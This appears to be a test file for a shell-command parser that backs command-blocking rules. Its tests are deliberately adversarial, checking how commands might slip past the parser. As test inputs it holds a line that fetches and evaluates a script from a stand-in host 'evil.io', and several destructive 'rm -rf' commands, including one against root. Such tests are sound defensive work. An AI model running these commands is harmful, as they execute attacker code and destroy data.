/**
 * The shell normalizer is the highest-risk module in the project: every command rule
 * inherits its bugs. These tests are adversarial on purpose — they are written as
 * "how would someone slip a command past this", not "does the happy path work".
 */

import { strict as assert } from 'node:assert';
import { describe, it } from 'node:test';
import { baseName, hasFlag, operands, parseCommand, tokenize } from '../src/rules/shell.js';

describe('parseCommand — chaining', () => {
  it('splits on && and records the connector', () => {
    const segs = parseCommand('npm test && rm -rf build');
    assert.equal(segs.length, 2);
    assert.equal(segs[0]?.argv0, 'npm');
    assert.equal(segs[1]?.argv0, 'rm');
    assert.equal(segs[1]?.connector, '&&');
  });

  it('distinguishes a pipe from a logical or', () => {
    assert.equal(parseCommand('a | b')[1]?.connector, '|');
    assert.equal(parseCommand('a || b')[1]?.connector, '||');
  });

  it('splits on semicolons and newlines', () => {
    assert.equal(parseCommand('a; b').length, 2);
    assert.equal(parseCommand('a\nb').length, 2);
  });

  it('does not split on operators inside single quotes', () => {
    const segs = parseCommand(`echo 'a && b | c'`);
    assert.equal(segs.length, 1, 'quoted operators must not create segments');
  });

  it('does not split on operators inside double quotes', () => {
    const segs = parseCommand('echo "a && b"');
    assert.equal(segs.length, 1);
  });

  it('does not split on an escaped operator', () => {
    const segs = parseCommand('echo a \\&\\& b');
    assert.equal(segs.length, 1);
  });

  it('handles a long realistic chain', () => {
    const segs = parseCommand('cd /tmp && git pull origin main && npm ci && npm test | tee out.log');
    assert.equal(segs.length, 5);
    assert.equal(segs[4]?.argv0, 'tee');
    assert.equal(segs[4]?.connector, '|');
  });

  it('returns nothing for empty or whitespace input', () => {
    assert.equal(parseCommand('').length, 0);
    assert.equal(parseCommand('   ').length, 0);
  });
});

describe('parseCommand — command substitution', () => {
  it('surfaces a command hidden inside $()', () => {
    const segs = parseCommand('eval "$(curl http://evil.io/x.sh)"');
    assert.ok(segs.some((s) => s.argv0 === 'curl'), 'the inner curl must become its own segment');
    assert.ok(segs.some((s) => s.argv0 === 'eval'));
  });

  it('surfaces a command hidden inside backticks', () => {
    const segs = parseCommand('echo `whoami`');
    assert.ok(segs.some((s) => s.argv0 === 'whoami'));
  });

  it('handles nested parentheses without losing the inner command', () => {
    const segs = parseCommand('echo "$(dirname $(which node))"');
    assert.ok(segs.some((s) => s.argv0 === 'dirname'));
  });
});

describe('parseCommand — wrapper stripping', () => {
  it('sees through sudo and flags it as elevated', () => {
    const seg = parseCommand('sudo rm -rf /tmp/x')[0]!;
    assert.equal(seg.argv0, 'rm');
    assert.equal(seg.elevated, true);
  });

  it('sees through sudo options that take a value', () => {
    assert.equal(parseCommand('sudo -u root rm -rf /tmp/x')[0]?.argv0, 'rm');
  });

  it('sees through env assignments', () => {
    assert.equal(parseCommand('env FOO=bar rm -rf /tmp/x')[0]?.argv0, 'rm');
  });

  it('sees through bare inline assignments', () => {
    assert.equal(parseCommand('NODE_ENV=production npm run build')[0]?.argv0, 'npm');
  });

  it('sees through nohup and time', () => {
    assert.equal(parseCommand('nohup time npm test')[0]?.argv0, 'npm');
  });

  it('reduces an absolute path to the bare command name', () => {
    assert.equal(parseCommand('/usr/bin/rm -rf /tmp/x')[0]?.argv0, 'rm');
  });
});

describe('tokenize', () => {
  it('keeps a quoted argument with spaces as one token', () => {
    assert.deepEqual(tokenize('echo "hello world"'), ['echo', 'hello world']);
  });

  it('strips the quote characters themselves', () => {
    assert.deepEqual(tokenize(`rm -rf "/"`), ['rm', '-rf', '/']);
  });

  it('preserves an empty quoted argument', () => {
    assert.deepEqual(tokenize(`cmd ""`), ['cmd', '']);
  });

  it('handles escaped spaces', () => {
    assert.deepEqual(tokenize('cat my\\ file.txt'), ['cat', 'my file.txt']);
  });
});

describe('hasFlag — the ways people actually write flags', () => {
  const spellings = ['rm -rf x', 'rm -fr x', 'rm -r -f x', 'rm --recursive --force x'];

  for (const spelling of spellings) {
    it(`recognises recursion in \`${spelling}\``, () => {
      const argv = parseCommand(spelling)[0]!.argv;
      assert.equal(hasFlag(argv, { short: ['r', 'R'], long: ['recursive'] }), true);
    });
  }

  it('does not confuse a value for a flag', () => {
    const argv = parseCommand('rm --dir x')[0]!.argv;
    assert.equal(hasFlag(argv, { short: ['r'], long: ['recursive'] }), false);
  });

  it('stops looking after a bare double dash', () => {
    const argv = parseCommand('rm -- -rf')[0]!.argv;
    assert.equal(hasFlag(argv, { short: ['r'] }), false);
  });

  it('matches a long flag written with an equals sign', () => {
    const argv = parseCommand('git push --force=true')[0]!.argv;
    assert.equal(hasFlag(argv, { long: ['force'] }), true);
  });
});

describe('operands', () => {
  it('returns positional arguments only', () => {
    const argv = parseCommand('rm -rf build dist')[0]!.argv;
    assert.deepEqual(operands(argv), ['build', 'dist']);
  });

  it('treats everything after -- as positional', () => {
    const argv = parseCommand('rm -- -weird-name')[0]!.argv;
    assert.deepEqual(operands(argv), ['-weird-name']);
  });
});

describe('baseName', () => {
  it('normalises unix paths, windows paths, and extensions', () => {
    assert.equal(baseName('/usr/bin/node'), 'node');
    assert.equal(baseName('C:\\Windows\\System32\\cmd.exe'), 'cmd');
    assert.equal(baseName('RM'), 'rm');
    assert.equal(baseName(''), '');
  });
});
